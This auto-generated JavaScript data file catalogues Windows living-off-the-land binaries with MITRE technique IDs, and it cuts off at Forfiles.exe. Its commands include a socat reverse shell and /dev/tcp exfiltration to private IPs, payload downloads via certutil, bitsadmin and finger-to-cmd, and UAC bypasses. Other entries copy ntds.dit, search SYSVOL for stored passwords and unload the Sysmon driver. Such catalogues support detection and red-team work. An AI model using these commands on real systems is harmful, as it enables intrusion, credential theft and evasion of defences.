// Generated Automatically
// Windows: 230 | Linux: 449
const LOLBinsData = {
    "windows": [
        {
            "name": "code.exe",
            "description": "VSCode binary, also portable (CLI) version",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Starts a reverse PowerShell connection over global.rel.tunnels.api.visualstudio.com via websockets; command",
                    "code": "code.exe tunnel --accept-server-license-terms --name \"tunnel-name\""
                }
            ],
            "mitre": {
                "technique": "T1219.001",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1219.001/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "GfxDownloadWrapper.exe",
            "description": "Remote file download used by the Intel Graphics Control Panel, receives as first parameter a URL and a destination file path.",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "GfxDownloadWrapper.exe downloads the content that returns URL and writes it to the file DESTINATION FILE PATH. The binary is signed by \"Microsoft Windows Hardware\", \"Compatibility Publisher\", \"Microsoft Windows Third Party Component CA 2012\", \"Microsoft Time-Stamp PCA 2010\", \"Microsoft Time-Stamp Service\".",
                    "code": "C:\\Windows\\System32\\DriverStore\\FileRepository\\igdlh64.inf_amd64_[0-9]+\\GfxDownloadWrapper.exe \"URL\" \"DESTINATION FILE\""
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Powershell.exe",
            "description": "Powershell.exe is a a task-based command-line shell built on .NET.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Set the execution policy to bypass and execute a PowerShell script without warning",
                    "code": "powershell.exe -ep bypass -file c:\\path\\to\\a\\script.ps1"
                },
                {
                    "label": "Set the execution policy to bypass and execute a PowerShell command",
                    "code": "powershell.exe -ep bypass -command \"Invoke-AllTheThings...\""
                },
                {
                    "label": "Set the execution policy to bypass and execute a very malicious PowerShell encoded command",
                    "code": "powershell.exe -ep bypass -ec IgBXAGUAIAA8ADMAIABMAE8ATABCAEEAUwAiAA=="
                }
            ],
            "mitre": {
                "technique": "T1059.001",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1059.001/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "AddinUtil.exe",
            "description": ".NET Tool used for updating cache files for Microsoft Office Add-Ins.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "AddinUtil is executed from the directory where the 'Addins.Store' payload exists, AddinUtil will execute the 'Addins.Store' payload.",
                    "code": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AddinUtil.exe -AddinRoot:."
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "AppInstaller.exe",
            "description": "Tool used for installation of AppX/MSIX applications on Windows 10",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in INetCache.",
                    "code": "start ms-appinstaller://?source={REMOTEURL:.exe}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Aspnet_Compiler.exe",
            "description": "ASP.NET Compilation Tool",
            "categories": [
                "awl-bypass"
            ],
            "commands": [
                {
                    "label": "Execute C# code with the Build Provider and proper folder structure in place.",
                    "code": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe -v none -p C:\\users\\cpl.internal\\desktop\\asptest\\ -f C:\\users\\cpl.internal\\desktop\\asptest\\none -u"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "At.exe",
            "description": "Schedule periodic tasks",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Create a recurring task to execute every day at a specific time.",
                    "code": "C:\\Windows\\System32\\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su {CMD}"
                }
            ],
            "mitre": {
                "technique": "T1053.002",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1053.002/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Atbroker.exe",
            "description": "Helper binary for Assistive Technology (AT)",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Start a registered Assistive Technology (AT).",
                    "code": "ATBroker.exe /start malware"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Bash.exe",
            "description": "File used by Windows subsystem for Linux",
            "categories": [
                "execute",
                "awl-bypass"
            ],
            "commands": [
                {
                    "label": "Executes executable from bash.exe",
                    "code": "bash.exe -c \"{CMD}\""
                },
                {
                    "label": "Executes a reverse shell",
                    "code": "bash.exe -c \"socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane\""
                },
                {
                    "label": "Exfiltrate data",
                    "code": "bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24'"
                },
                {
                    "label": "Executes executable from bash.exe",
                    "code": "bash.exe -c \"{CMD}\""
                },
                {
                    "label": "When executed, `bash.exe` queries the registry value of `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Lxss\\MSI\\InstallLocation`, which contains a folder path (`c:\\program files\\wsl` by default). If the value points to another folder containing a file named `wsl.exe`, it will be executed instead of the legitimate `wsl.exe` in the program files folder.",
                    "code": "bash.exe"
                }
            ],
            "mitre": {
                "technique": "T1202",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1202/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Bitsadmin.exe",
            "description": "Used for managing background intelligent transfer",
            "categories": [
                "execute",
                "download",
                "copy"
            ],
            "commands": [
                {
                    "label": "Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data stream, then resume and complete the job.",
                    "code": "bitsadmin /create 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1"
                },
                {
                    "label": "Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.",
                    "code": "bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1"
                },
                {
                    "label": "Command for copying cmd.exe to another folder",
                    "code": "bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset"
                },
                {
                    "label": "One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.",
                    "code": "bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset"
                }
            ],
            "mitre": {
                "technique": "T1564.004",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1564.004/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "CertOC.exe",
            "description": "Used for installing certificates",
            "categories": [
                "execute",
                "download"
            ],
            "commands": [
                {
                    "label": "Loads the target DLL file",
                    "code": "certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}"
                },
                {
                    "label": "Downloads text formatted files",
                    "code": "certoc.exe -GetCACAPS {REMOTEURL:.ps1}"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "CertReq.exe",
            "description": "Used for requesting and managing certificates",
            "categories": [
                "download",
                "upload"
            ],
            "commands": [
                {
                    "label": "Send the specified file (penultimate argument) to the specified URL via HTTP POST and save the response to the specified txt file (last argument).",
                    "code": "CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}"
                },
                {
                    "label": "Send the specified file (last argument) to the specified URL via HTTP POST and show response in terminal.",
                    "code": "CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Certutil.exe",
            "description": "Windows binary used for handling certificates",
            "categories": [
                "download",
                "execute",
                "encode",
                "decode"
            ],
            "commands": [
                {
                    "label": "Download and save an executable to disk in the current folder.",
                    "code": "certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}"
                },
                {
                    "label": "Download and save an executable to disk in the current folder when a file path is specified, or `%LOCALAPPDATA%low\\Microsoft\\CryptnetUrlCache\\Content\\<hash>` when not.",
                    "code": "certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe}"
                },
                {
                    "label": "Download and save a .ps1 file to an Alternate Data Stream (ADS).",
                    "code": "certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt"
                },
                {
                    "label": "Download and save an executable to `%LOCALAPPDATA%low\\Microsoft\\CryptnetUrlCache\\Content\\<hash>`.",
                    "code": "certutil.exe -URL {REMOTEURL:.exe}"
                },
                {
                    "label": "Command to encode a file using Base64",
                    "code": "certutil -encode {PATH} {PATH:.base64}"
                },
                {
                    "label": "Command to decode a Base64 encoded file.",
                    "code": "certutil -decode {PATH:.base64} {PATH}"
                },
                {
                    "label": "Command to decode a hexadecimal-encoded file.",
                    "code": "certutil -decodehex {PATH:.hex} {PATH}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Change.exe",
            "description": "Remote Desktop Services MultiUser Change Utility",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Once executed, `change.exe` will execute `chgusr.exe` in the same folder. Thus, if `change.exe` is copied to a folder and an arbitrary executable is renamed to `chgusr.exe`, `change.exe` will spawn it. Instead of `user`, it is also possible to use `port` or `logon` as command-line option.",
                    "code": "change.exe user"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Cipher.exe",
            "description": "File Encryption Utility",
            "categories": [
                "tamper"
            ],
            "commands": [
                {
                    "label": "Zero out a file",
                    "code": "cipher /w:{PATH_ABSOLUTE:folder}"
                }
            ],
            "mitre": {
                "technique": "T1485",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1485/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Cmd.exe",
            "description": "The command-line interpreter in Windows",
            "categories": [
                "execute",
                "download",
                "upload"
            ],
            "commands": [
                {
                    "label": "Add content to an Alternate Data Stream (ADS).",
                    "code": "cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat"
                },
                {
                    "label": "Execute payload.bat stored in an Alternate Data Stream (ADS).",
                    "code": "cmd.exe - < {PATH}:payload.bat"
                },
                {
                    "label": "Downloads a specified file from a WebDAV server to the target file.",
                    "code": "type {PATH_SMB} > {PATH_ABSOLUTE}"
                },
                {
                    "label": "Uploads a specified file to a WebDAV server.",
                    "code": "type {PATH_ABSOLUTE} > {PATH_SMB}"
                }
            ],
            "mitre": {
                "technique": "T1564.004",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1564.004/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Cmdkey.exe",
            "description": "creates, lists, and deletes stored user names and passwords or credentials.",
            "categories": [
                "credentials"
            ],
            "commands": [
                {
                    "label": "List cached credentials",
                    "code": "cmdkey /list"
                }
            ],
            "mitre": {
                "technique": "T1078",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1078/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "cmdl32.exe",
            "description": "Microsoft Connection Manager Auto-Download",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "Download a file from the web address specified in the configuration file. The downloaded file will be in %TMP% under the name VPNXXXX.tmp where \"X\" denotes a random number or letter.",
                    "code": "cmdl32 /vpn /lan %cd%\\config"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Cmstp.exe",
            "description": "Installs or removes a Connection Manager service profile.",
            "categories": [
                "execute",
                "awl-bypass"
            ],
            "commands": [
                {
                    "label": "Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.",
                    "code": "cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}"
                },
                {
                    "label": "Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.",
                    "code": "cmstp.exe /ni /s {REMOTEURL:.inf}"
                }
            ],
            "mitre": {
                "technique": "T1218.003",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.003/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Colorcpl.exe",
            "description": "Binary that handles color management",
            "categories": [
                "copy"
            ],
            "commands": [
                {
                    "label": "Copies the referenced file to C:\\Windows\\System32\\spool\\drivers\\color\\.",
                    "code": "colorcpl {PATH}"
                }
            ],
            "mitre": {
                "technique": "T1036.005",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1036.005/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "ComputerDefaults.exe",
            "description": "ComputerDefaults.exe is a Windows system utility for managing default applications for tasks like web browsing, emailing, and media playback.",
            "categories": [
                "uac-bypass"
            ],
            "commands": [
                {
                    "label": "Upon execution, ComputerDefaults.exe checks two registry values at HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\open\\command; if these are set by an attacker, the set command will be executed as a high-integrity process without a UAC prompt being displayed to the user. See 'resources' for which registry keys/values to set.",
                    "code": "ComputerDefaults.exe"
                }
            ],
            "mitre": {
                "technique": "T1548.002",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1548.002/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "ConfigSecurityPolicy.exe",
            "description": "Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.",
            "categories": [
                "upload",
                "download"
            ],
            "commands": [
                {
                    "label": "Upload file, credentials or data exfiltration in general",
                    "code": "ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}"
                },
                {
                    "label": "It will download a remote payload and place it in INetCache.",
                    "code": "ConfigSecurityPolicy.exe {REMOTEURL}"
                }
            ],
            "mitre": {
                "technique": "T1567",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1567/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Conhost.exe",
            "description": "Console Window host",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute a command line with conhost.exe as parent process",
                    "code": "conhost.exe {CMD}"
                },
                {
                    "label": "Execute a command line with conhost.exe as parent process",
                    "code": "conhost.exe --headless {CMD}"
                }
            ],
            "mitre": {
                "technique": "T1202",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1202/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Control.exe",
            "description": "Binary used to launch controlpanel items in Windows",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute evil.dll which is stored in an Alternate Data Stream (ADS).",
                    "code": "control.exe {PATH_ABSOLUTE}:evil.dll"
                },
                {
                    "label": "Execute .cpl file. A CPL is a DLL file with CPlApplet export function)",
                    "code": "control.exe {PATH_ABSOLUTE:.cpl}"
                }
            ],
            "mitre": {
                "technique": "T1218.002",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.002/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Csc.exe",
            "description": "Binary file used by .NET Framework to compile C# code",
            "categories": [
                "compile"
            ],
            "commands": [
                {
                    "label": "Use csc.exe to compile C# code, targeting the .NET Framework, stored in the specified .cs file and output the compiled version to the specified .exe path.",
                    "code": "csc.exe -out:{PATH:.exe} {PATH:.cs}"
                },
                {
                    "label": "Use csc.exe to compile C# code, targeting the .NET Framework, stored in the specified .cs file and output the compiled version to a DLL file with the same name.",
                    "code": "csc -target:library {PATH:.cs}"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Cscript.exe",
            "description": "Binary used to execute scripts in Windows",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Use cscript.exe to exectute a Visual Basic script stored in an Alternate Data Stream (ADS).",
                    "code": "cscript //e:vbscript {PATH_ABSOLUTE}:script.vbs"
                }
            ],
            "mitre": {
                "technique": "T1564.004",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1564.004/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "CustomShellHost.exe",
            "description": "A host process that is used by custom shells when using Windows in Kiosk mode.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Executes explorer.exe (with command-line argument /NoShellRegistrationCheck) if present in the current working folder.",
                    "code": "CustomShellHost.exe"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "DataSvcUtil.exe",
            "description": "DataSvcUtil.exe is a command-line tool provided by WCF Data Services that consumes an Open Data Protocol (OData) feed and generates the client data service classes that are needed to access a data service from a .NET Framework client application.",
            "categories": [
                "upload"
            ],
            "commands": [
                {
                    "label": "Upload file, credentials or data exfiltration in general",
                    "code": "DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}"
                }
            ],
            "mitre": {
                "technique": "T1567",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1567/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Desktopimgdownldr.exe",
            "description": "Windows binary used to configure lockscreen/desktop image",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "Downloads the file and sets it as the computer's lockscreen",
                    "code": "set \"SYSTEMROOT=C:\\Windows\\Temp\" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "DeviceCredentialDeployment.exe",
            "description": "Device Credential Deployment",
            "categories": [
                "conceal"
            ],
            "commands": [
                {
                    "label": "Grab the console window handle and set it to hidden",
                    "code": "DeviceCredentialDeployment"
                }
            ],
            "mitre": {
                "technique": "T1564",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1564/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Dfsvc.exe",
            "description": "ClickOnce engine in Windows used by .NET",
            "categories": [
                "awl-bypass"
            ],
            "commands": [
                {
                    "label": "Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host)",
                    "code": "rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}"
                }
            ],
            "mitre": {
                "technique": "T1127.002",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127.002/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Diantz.exe",
            "description": "Binary that package existing files into a cabinet (.cab) file",
            "categories": [
                "execute",
                "download"
            ],
            "commands": [
                {
                    "label": "Compress a file (first argument) into a CAB file stored in the Alternate Data Stream (ADS) of the target file.",
                    "code": "diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab"
                },
                {
                    "label": "Download and compress a remote file and store it in a CAB file on local machine.",
                    "code": "diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}"
                },
                {
                    "label": "Execute diantz directives as defined in the specified Diamond Definition File (.ddf); see resources for the format specification.",
                    "code": "diantz /f {PATH:.ddf}"
                }
            ],
            "mitre": {
                "technique": "T1564.004",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1564.004/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Diskshadow.exe",
            "description": "Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).",
            "categories": [
                "dump",
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute commands using diskshadow.exe from a prepared diskshadow script.",
                    "code": "diskshadow.exe /s {PATH:.txt}"
                },
                {
                    "label": "Execute commands using diskshadow.exe to spawn child process",
                    "code": "diskshadow> exec {PATH:.exe}"
                }
            ],
            "mitre": {
                "technique": "T1003.003",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1003.003/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Dnscmd.exe",
            "description": "A command-line interface for managing DNS servers",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details.",
                    "code": "dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}"
                }
            ],
            "mitre": {
                "technique": "T1543.003",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1543.003/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Esentutl.exe",
            "description": "Binary for working with Microsoft Joint Engine Technology (JET) database",
            "categories": [
                "copy",
                "execute",
                "download"
            ],
            "commands": [
                {
                    "label": "Copies the source VBS file to the destination VBS file.",
                    "code": "esentutl.exe /y {PATH_ABSOLUTE:.source.vbs} /d {PATH_ABSOLUTE:.dest.vbs} /o"
                },
                {
                    "label": "Copies the source EXE to an Alternate Data Stream (ADS) of the destination file.",
                    "code": "esentutl.exe /y {PATH_ABSOLUTE:.exe} /d {PATH_ABSOLUTE}:file.exe /o"
                },
                {
                    "label": "Copies the source Alternate Data Stream (ADS) to the destination EXE.",
                    "code": "esentutl.exe /y {PATH_ABSOLUTE}:file.exe /d {PATH_ABSOLUTE:.exe} /o"
                },
                {
                    "label": "Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file.",
                    "code": "esentutl.exe /y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe /o"
                },
                {
                    "label": "Copies the source EXE to the destination EXE file",
                    "code": "esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o"
                },
                {
                    "label": "Copies a (locked) file using Volume Shadow Copy",
                    "code": "esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d {PATH_ABSOLUTE:.dit}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Eudcedit.exe",
            "description": "Private Character Editor Windows Utility",
            "categories": [
                "uac-bypass"
            ],
            "commands": [
                {
                    "label": "Once executed, the Private Charecter Editor will be opened - click OK, then click File -> Font Links. In the next window choose the option \"Link with Selected Fonts\" and click on Save As, then in the opened enter the command you want to execute.",
                    "code": "eudcedit"
                }
            ],
            "mitre": {
                "technique": "T1548.002",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1548.002/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Eventvwr.exe",
            "description": "Displays Windows Event Logs in a GUI window.",
            "categories": [
                "uac-bypass"
            ],
            "commands": [
                {
                    "label": "During startup, eventvwr.exe checks the registry value `HKCU\\Software\\Classes\\mscfile\\shell\\open\\command` for the location of mmc.exe, which is used to open the eventvwr.msc saved console file. If the location of another binary or script is added to this registry value, it will be executed as a high-integrity process without a UAC prompt being displayed to the user.",
                    "code": "eventvwr.exe"
                },
                {
                    "label": "During startup, eventvwr.exe uses .NET deserialization with `%LOCALAPPDATA%\\Microsoft\\EventV~1\\RecentViews` file. This file can be created using https://github.com/pwntester/ysoserial.net",
                    "code": "ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c \"{CMD}\" > RecentViews & copy RecentViews %LOCALAPPDATA%\\Microsoft\\EventV~1\\RecentViews & eventvwr.exe"
                }
            ],
            "mitre": {
                "technique": "T1548.002",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1548.002/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Expand.exe",
            "description": "Binary that expands one or more compressed files",
            "categories": [
                "download",
                "copy",
                "execute"
            ],
            "commands": [
                {
                    "label": "Copies source file to destination.",
                    "code": "expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat}"
                },
                {
                    "label": "Copies source file to destination.",
                    "code": "expand {PATH_ABSOLUTE:.source.ext} {PATH_ABSOLUTE:.dest.ext}"
                },
                {
                    "label": "Copies source file to destination Alternate Data Stream (ADS)",
                    "code": "expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Explorer.exe",
            "description": "Binary used for managing files and system components within Windows",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute specified .exe with the parent process spawning from a new instance of explorer.exe",
                    "code": "explorer.exe /root,\"{PATH_ABSOLUTE:.exe}\""
                },
                {
                    "label": "Execute notepad.exe with the parent process spawning from a new instance of explorer.exe",
                    "code": "explorer.exe {PATH_ABSOLUTE:.exe}"
                }
            ],
            "mitre": {
                "technique": "T1202",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1202/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Extexport.exe",
            "description": "Load a DLL located in the c:\\test folder with a specific name.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Load a DLL located in the specified folder with one of the following names mozcrt19.dll, mozsqlite3.dll, or sqlite.dll.",
                    "code": "Extexport.exe {PATH_ABSOLUTE:folder} foo bar"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Extrac32.exe",
            "description": "Extract to ADS, copy or overwrite a file with Extrac32.exe",
            "categories": [
                "execute",
                "download",
                "copy"
            ],
            "commands": [
                {
                    "label": "Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file.",
                    "code": "extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe"
                },
                {
                    "label": "Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file.",
                    "code": "extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe"
                },
                {
                    "label": "Copy the source file to the destination file and overwrite it.",
                    "code": "extrac32 /Y /C {PATH_SMB} {PATH_ABSOLUTE}"
                },
                {
                    "label": "Command for copying file from one folder to another",
                    "code": "extrac32.exe /C {PATH_ABSOLUTE:.source.exe} {PATH_ABSOLUTE:.dest.exe}"
                }
            ],
            "mitre": {
                "technique": "T1564.004",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1564.004/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Findstr.exe",
            "description": "Write to ADS, discover, or download files with Findstr.exe",
            "categories": [
                "execute",
                "credentials",
                "download"
            ],
            "commands": [
                {
                    "label": "Searches for the string W3AllLov3LolBas, since it does not exist (/V) the specified .exe file is written to an Alternate Data Stream (ADS) of the specified target file.",
                    "code": "findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe"
                },
                {
                    "label": "Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.",
                    "code": "findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe"
                },
                {
                    "label": "Search for stored password in Group Policy files stored on SYSVOL.",
                    "code": "findstr /S /I cpassword \\\\sysvol\\policies\\*.xml"
                },
                {
                    "label": "Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is downloaded to the target file.",
                    "code": "findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe}"
                }
            ],
            "mitre": {
                "technique": "T1564.004",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1564.004/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Finger.exe",
            "description": "Displays information about a user or users on a specified remote computer that is running the Finger service or daemon",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "Downloads payload from remote Finger server. This example connects to \"example.host.com\" asking for user \"user\"; the result could contain malicious shellcode which is executed by the cmd process.",
                    "code": "finger user@example.host.com | more +2 | cmd"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "fltMC.exe",
            "description": "Filter Manager Control Program used by Windows",
            "categories": [
                "tamper"
            ],
            "commands": [
                {
                    "label": "Unloads a driver used by security agents",
                    "code": "fltMC.exe unload SysmonDrv"
                }
            ],
            "mitre": {
                "technique": "T1562.001",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1562.001/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Forfiles.exe",
